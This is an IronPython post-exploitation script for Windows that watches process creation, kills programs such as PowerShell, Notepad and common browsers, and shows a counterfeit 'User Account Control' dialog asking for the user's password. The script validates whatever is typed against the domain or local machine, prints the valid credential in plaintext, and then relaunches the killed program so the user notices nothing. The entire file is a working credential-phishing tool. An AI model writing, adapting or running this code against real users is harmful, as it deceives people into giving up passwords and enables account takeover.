##################################################
## IronPython Plaintext Credentials Phishing
##################################################
## Author: daddycocoaman
##################################################
import clr
clr.AddReference("System.Management")
clr.AddReference("System.DirectoryServices.AccountManagement")
clr.AddReference("System.Windows.Forms")
clr.AddReference("System.Drawing")
clr.AddReferenceByName("PresentationFramework, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35")
clr.AddReferenceByName("PresentationCore, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35")

import System.Windows as Windows
import System.Environment as Env

from System.Drawing import Point, Icon, Font, Color, FontStyle, ColorTranslator, Size, Image
from System.Windows.Forms import Form, Button, FormBorderStyle, FormStartPosition, DockStyle, TextBox, Label, PictureBox, Keys, KeyEventHandler, CloseReason, DialogResult, FlatStyle
from System.Windows.Forms import MessageBox, MessageBoxButtons, MessageBoxIcon, MessageBoxDefaultButton, MessageBoxOptions, FormClosingEventHandler
from System import TimeSpan, EventHandler
from System.Diagnostics import Process
from System.DirectoryServices.AccountManagement import PrincipalContext, ContextType
from System.Management import ManagementScope, ManagementObjectSearcher, WqlObjectQuery, ManagementEventWatcher, WqlEventQuery, EventArrivedEventHandler
from System.Threading import Thread
from System.Windows.Forms import BorderStyle

WATCHLIST = ["powershell.exe", "notepad.exe", "ida64.exe", "MicrosoftEdge.exe", "firefox.exe", "chrome.exe"]
GOT_CRED = False

class credPhish():
    def __init__(self, proc):
        self.proc = proc
        self.path = self.proc["TargetInstance"]["ExecutablePath"]
        self.name = self.proc["TargetInstance"]["Name"]
        
        self.popup()
        
    def SubmitHandler(self, sender, e):
        #Check if computer is part of a domain. 
        try:
            clr.AddReference("System.DirectoryServices.ActiveDirectory")
            ctxType = ContextType.Domain 
        except IOError:
            ctxType = ContextType.Machine

        ctx = PrincipalContext(ctxType)
        if ctx.ValidateCredentials(Env.UserName, self.inpBox.Text):
            startWatch.Stop()
            print "[+] CRED SUCCESS: Credentials validated against {0} -- {1}:{2}".format(ctx.ConnectedServer, Env.UserName, self.inpBox.Text)
            self.form.Dispose()
            self.form.Close()

            self.NewProcess = Process()
            self.NewProcess.StartInfo.FileName = self.path
            self.NewProcess.StartInfo.Arguments = self.proc['TargetInstance']['CommandLine'].replace("\"{0}\"".format(self.path), "")
            GOT_CRED = True
        else:
            print "[-] CRED FAIL: Credentials failed against {0} -- {1}:{2}".format(Env.MachineName, Env.UserName, self.inpBox.Text)
            MessageBox.Show("Invalid Credentials!", "", MessageBoxButtons.OK, MessageBoxIcon.Warning, MessageBoxDefaultButton.Button1, MessageBoxOptions.DefaultDesktopOnly)

    def CancelHandler(self, sender, e):
        if e.CloseReason == CloseReason.UserClosing:
            print "[+] CANCELED: Check canceled by user"

    def CancelButtonHandler(self, sender, e):
        print "[+] CANCELED: Check canceled by user"

    def popup(self):
        self.form = Form()
        self.form.Text = "  User Account Control"
        self.form.MaximizeBox = False
        self.form.MinimizeBox = False
        self.form.Width = 430
        self.form.Height = 270
        
        self.form.Icon = None
        self.form.StartPosition = FormStartPosition.CenterScreen
        self.form.FormBorderStyle = FormBorderStyle.FixedDialog
        self.form.TopMost = True
        self.form.BackColor = ColorTranslator.FromHtml("#E6E6E6")

        self.tbox = Label()
        self.tbox.Text = "  Do you want to allow this app to make\n  changes to your device?"
        self.tbox.Location = Point(0, 0)
        self.tbox.Width = self.form.Width
        self.tbox.Height = 60
        self.tbox.Font = Font("Segoe UI", 13)
        self.tbox.BackColor = ColorTranslator.FromHtml("#2D89EF")

        self.pb = PictureBox()
        self.pb.Parent = self.form
        self.pb.Size = Size(50, 40)
        self.pb.Location = Point(13, 80)
        self.pb.Image = Icon.ExtractAssociatedIcon(self.path).ToBitmap()

        self.namebox = Label()
        self.namebox.Text = " {} for Windows".format(str(self.name).replace('.exe','').capitalize())
        self.namebox.Location = Point(55, 82)
        self.namebox.Width = self.form.Width - 60
        self.namebox.Height = 30
        self.namebox.Font = Font("Segoe UI", 13)

        self.please = Label()
        self.please.Text = " Please, confirm your Password to continue:"
        self.please.Location = Point(7, 125)
        self.please.Width = self.form.Width - 60
        self.please.Height = 30
        self.please.Font = Font("Segoe UI", 12)
        
        self.inpBox = TextBox()
        self.inpBox.AcceptsReturn = True
        self.inpBox.Location = Point(13, 155)
        self.inpBox.Font = Font("Segoe UI", 10) 
        self.inpBox.AutoSize = False
        self.inpBox.Size = Size(380, 25)
        self.inpBox.UseSystemPasswordChar = True
        self.inpBox.BorderStyle = BorderStyle.FixedSingle

        self.valButton = Button()
        self.valButton.BackColor = ColorTranslator.FromHtml("#CCCCCC")
        self.valButton.Text = "Confirm"
        self.valButton.Size = Size(190, 27)
        self.valButton.Location = Point(13, 190)
        self.valButton.FlatStyle = FlatStyle.Flat
        self.valButton.Font = Font("Segoe UI", 10)
        self.valButton.Click += EventHandler(self.SubmitHandler)

        self.canButton = Button()
        self.canButton.BackColor = ColorTranslator.FromHtml("#CCCCCC")
        self.canButton.Text = "Cancel"
        self.canButton.Size = Size(190, 27)
        self.canButton.FlatStyle = FlatStyle.Flat
        self.canButton.Location = Point(204, 190)
        self.canButton.Font = Font("Segoe UI", 10)
        self.canButton.Click += EventHandler(self.CancelButtonHandler)
        
        self.form.AcceptButton = self.valButton
        self.form.CancelButton = self.canButton
        self.form.Controls.Add(self.please)
        self.form.Controls.Add(self.pb)
        self.form.Controls.Add(self.valButton)
        self.form.Controls.Add(self.canButton)
        self.form.Controls.Add(self.inpBox)
        self.form.Controls.Add(self.tbox)
        self.form.Controls.Add(self.namebox)

        self.form.ActiveControl = self.tbox
        self.form.FormClosing += FormClosingEventHandler(self.CancelHandler)
        self.form.ShowDialog()
        

def ProcEventHandler(sender, e):
    proc = e.NewEvent
    if proc['TargetInstance']['Name'] in WATCHLIST:
        Process.GetProcessById(proc['TargetInstance']['ProcessId']).Kill()
        print "[+] KILL SUCCESS: {0}\t{1}".format(proc['TargetInstance']['ProcessId'], proc['TargetInstance']['CommandLine'])
        cp = credPhish(proc)
        print "[+] PROCESS SPAWNED: {0} {1}".format(cp.path, cp.NewProcess.StartInfo.Arguments)
        cp.NewProcess.Start()
        print "[!] PROCESS EXIT CODE: {0}".format(cp.NewProcess.ExitCode)

def procWatch():
    while GOT_CRED is False:
        try:
            proc = startWatch.WaitForNextEvent()
            if proc['TargetInstance']['Name'] in WATCHLIST:
                Process.GetProcessById(proc['TargetInstance']['ProcessId']).Kill()
                print "[+] KILL SUCCESS: {0}\t{1}".format(proc['TargetInstance']['ProcessId'], proc['TargetInstance']['CommandLine'])
                
                cp = credPhish(proc)
                if hasattr(cp, "NewProcess"):
                    cp.NewProcess.Start()
                    print "[+] PROCESS SPAWNED: {0}\t{1} {2}".format(cp.NewProcess.Id, cp.path, cp.NewProcess.StartInfo.Arguments)
                    #Process.GetCurrentProcess.Kill()
                    Thread.GetCurrentThread().Abort()
        except:
            break
try:
    print "[*] Watching Process Creation for: {0}".format(", ".join(WATCHLIST))
    startWatch = ManagementEventWatcher(WqlEventQuery("__InstanceCreationEvent", TimeSpan(0,0,1), 'TargetInstance isa "Win32_Process"' ))
    procWatch()
except KeyboardInterrupt:
    print "[*] Exiting."
